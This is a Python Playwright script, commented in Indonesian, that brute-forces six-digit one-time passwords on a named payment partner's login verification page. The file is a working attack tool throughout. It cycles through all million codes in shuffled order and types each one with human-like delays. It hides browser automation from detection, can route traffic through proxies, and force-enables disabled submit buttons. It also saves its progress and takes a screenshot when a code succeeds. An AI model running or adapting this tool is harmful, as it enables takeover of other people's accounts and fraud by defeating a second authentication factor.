#!/usr/bin/env python3

import os
import sys
import time
import json
import random
from playwright.sync_api import sync_playwright

# ---------------- KONFIGURASI ----------------
TARGET_URL    = "https://partner.e-powerpay.id/verify-login"
STATE_FILE    = "otp_pathright_state.json"
USER_DATA_DIR = "./playwright_profile"  # Direktori untuk menyimpan sesi/cookie lokal

# Konfigurasi Proxy (Opsional, kosongkan jika menggunakan jaringan lokal)
# Format: "http://username:password@ip:port" atau "http://ip:port"
PROXY_URL     = os.getenv("PROXY_URL", "").strip()


# ---------------- MANAJEMEN STATE & RANDOM LIST ----------------
def get_shuffled_otp_list() -> tuple:
    """Membuat atau memuat daftar kombinasi 000000-999999 dalam urutan acak."""
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, "r") as f:
                data = json.load(f)
                print(f"[state] Memuat daftar kombinasi acak (Progress: {data.get('index', 0)} / 1000000)")
                return data.get("shuffled_list", []), data.get("index", 0)
        except Exception:
            pass

    print("[state] Membuat daftar kombinasi 6-digit acak baru (000000 - 999999)...")
    otp_list = [f"{i:06d}" for i in range(1000000)]
    random.shuffle(otp_list)
    
    save_state(otp_list, 0)
    return otp_list, 0

def save_state(shuffled_list: list, index: int):
    try:
        with open(STATE_FILE, "w") as f:
            json.dump({"index": index, "shuffled_list": shuffled_list}, f)
    except Exception:
        pass


# ---------------- DETEKSI HASIL OTP ----------------
def check_otp_result(page) -> str:
    current_url = page.url.lower()

    if "verify-login" not in current_url:
        if "dashboard" in current_url or "partner." in current_url and "verify" not in current_url:
            return "success"
        return "redirected"

    try:
        body_text = (page.inner_text("body") or "").lower()
    except Exception:
        body_text = ""

    error_keywords = ["salah", "invalid", "expired", "kadaluarsa", "gagal", "incorrect", "wrong", "request"]
    if any(k in body_text for k in error_keywords):
        return "invalid_otp"

    try:
        logout = page.query_selector('a[href*="logout" i], button:has-text("Logout"), [class*="dashboard" i]')
        if logout and logout.is_visible():
            return "success"
    except Exception:
        pass

    return "unknown"


# ---------------- UTAMA: BRUTEFORCE ANTI-INVALID REQUEST ----------------
def run_bruteforce(page):
    print(f"[bruteforce] Membuka target: {TARGET_URL}")
    page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=45000)
    time.sleep(3)

    otp_list, start_index = get_shuffled_otp_list()
    total_combinations = len(otp_list)

    print(f"[bruteforce] Memulai pengujian acak dari indeks {start_index} dari {total_combinations}...")

    for idx in range(start_index, total_combinations):
        otp_str = otp_list[idx]
        print(f"[*] Mencoba OTP: {otp_str} [Indeks: {idx}] ...", end="", flush=True)

        try:
            if "verify-login" not in page.url.lower():
                print(" ⚠️ Ter-redirect, memuat ulang halaman...", end="", flush=True)
                page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=30000)
                time.sleep(2)

            # Temukan elemen kotak input secara presisi menggunakan Playwright Handle
            # lalu isi dengan simulasi klik manusia (human-like click & type) agar event listener web aktif sempurna.
            inputs_handle = page.query_selector_all('input')
            target_inputs = []
            
            for el in inputs_handle:
                try:
                    max_len = el.get_attribute("maxlength")
                    aria = (el.get_attribute("aria-label") or "").lower()
                    cls = (el.get_attribute("class") or "").lower()
                    
                    if max_len == "1" or "digit" in aria or "otp" in cls or "pin" in cls:
                        target_inputs.append(el)
                except:
                    continue

            # Jika filter spesifik gagal, ambil input teks biasa yang berjumlah 6 buah
            if len(target_inputs) < 6:
                target_inputs = [el for el in inputs_handle if el.get_attribute("type") in ["text", "tel"] or not el.get_attribute("type")]

            if len(target_inputs) >= 6:
                for j in range(6):
                    box = target_inputs[j]
                    box.click() # Klik secara nyata agar fokus browser aktif
                    time.sleep(random.uniform(0.02, 0.05))
                    
                    # Bersihkan nilai lama jika ada
                    box.fill("")
                    # Ketik digit satu per satu dengan delay acak khas manusia
                    page.keyboard.type(otp_str[j], delay=random.randint(40, 90))
            else:
                # Fallback terakhir menggunakan selector atribut jika struktur DOM spesifik
                for digit_idx, digit in enumerate(otp_str, start=1):
                    selector = f'input[aria-label="Digit {digit_idx}"]' if digit_idx > 1 else 'input[aria-label*="Digit 1" i], input[aria-label*="Please enter verification code" i]'
                    page.click(selector)
                    page.fill(selector, digit)
                    time.sleep(0.05)

            # Jeda mikro setelah input lengkap sebelum menekan tombol submit
            time.sleep(random.uniform(0.2, 0.4))

            # Klik tombol Submit / Verify dengan simulasi klik mouse natural
            submit_btn = page.query_selector('button[type="submit"], button:has-text("Verify"), button:has-text("Konfirmasi"), button:has-text("Submit")')
            if submit_btn and submit_btn.is_enabled():
                submit_btn.click()
            else:
                page.evaluate('const btn = document.querySelector("button[type=\'submit\']"); if(btn) { btn.removeAttribute("disabled"); btn.click(); }')

            # Berikan waktu tunggu respons server
            time.sleep(1.3)

            status = check_otp_result(page)
            if status == "success":
                print(f" ✅ [BERHASIL] KODE OTP DITEMUKAN: {otp_str}")
                page.screenshot(path=f"success_otp_{otp_str}.png", full_page=True)
                if os.path.exists(STATE_FILE):
                    os.remove(STATE_FILE)
                return otp_str
            elif status == "invalid_otp":
                print(" ❌ Salah / Invalid Request")
            elif status == "redirected":
                print(" ⚠️ Dialihkan oleh sistem, kembali ke form...")
            else:
                print(" ⚠️ Respon tidak pasti, lanjut...")

            # Simpan progress setiap 5 percobaan
            if idx % 5 == 0:
                save_state(otp_list, idx)

        except Exception as e:
            print(f" [Error pada OTP {otp_str}]: {e}")
            save_state(otp_list, idx)
            try:
                page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=15000)
            except:
                pass
            time.sleep(2)

    print("[!] Bruteforce selesai tanpa hasil.")
    return None


def main():
    with sync_playwright() as p:
        launch_args = {
            "headless": True,   # <--- Ubah dari False menjadi True
            "args": [
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-dev-shm-usage"
            ]
        }
        
        # Tambahkan konfigurasi proxy jika PROXY_URL diisi
        if PROXY_URL:
            launch_args["proxy"] = {"server": PROXY_URL}

        print("[playwright] Meluncurkan browser lokal (Persistent Context)...")
        # Menggunakan launch_persistent_context agar cookie, cache, dan sesi tersimpan otomatis
        context = p.chromium.launch_persistent_context(
            user_data_dir=USER_DATA_DIR,
            **launch_args
        )

        # Mengatur viewport awal
        page = context.pages[0] if context.pages else context.new_page()
        page.set_viewport_size({"width": 1280, "height": 800})

        try:
            run_bruteforce(page)
        finally:
            print("[playwright] Menutup sesi browser...")
            context.close()


if __name__ == "__main__":
    main()
